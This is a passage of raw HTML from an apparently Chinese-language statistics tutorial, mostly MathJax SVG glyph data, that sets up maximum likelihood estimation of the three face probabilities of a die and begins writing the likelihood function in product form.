-194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4302.1,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mstyle\" transform=\"translate(4580.1,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"mi\" transform=\"translate(5746.8,0)\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6497.8,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(6886.8,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7386.8,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8053.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(9109.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(10048.9,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mstyle\" transform=\"translate(10326.9,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"mi\" transform=\"translate(11493.6,0)\"><path data-c=\"1D443\" d=\"M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12244.6,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(12633.6,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(13133.6,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(13800.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(14856.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(15795.7,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mstyle\" transform=\"translate(16073.7,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"mtext\" transform=\"translate(17240.3,0)\"><text data-variant=\"normal\" transform=\"scale(1,-1)\" font-size=\"884px\" font-family=\"serif\">且</text><path data-c=\"A0\" d=\"\" transform=\"translate(1000,0)\"/></g><g data-mml-node=\"msub\" transform=\"translate(18490.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(19652.1,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(20652.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(21814.1,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(22814.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(24031.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(25087.4,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span> 我们要估计 (<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"8.389ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 3708 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(939.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1384.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2323.8,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2768.4,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g></g></g></svg></mjx-container></span>)，使得这个骰子<strong>最可能产生上述结果</strong>。</p>\n<hr>\n<p><strong>步骤 2：写出似然函数（乘积形式）</strong></p>\n<p>所有结果的联合概率为： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.594ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"24.353ex\" height=\"2.594ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -883.9 10764.1 1146.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(681,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1070,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2009.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2454.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3393.8,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3838.4,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 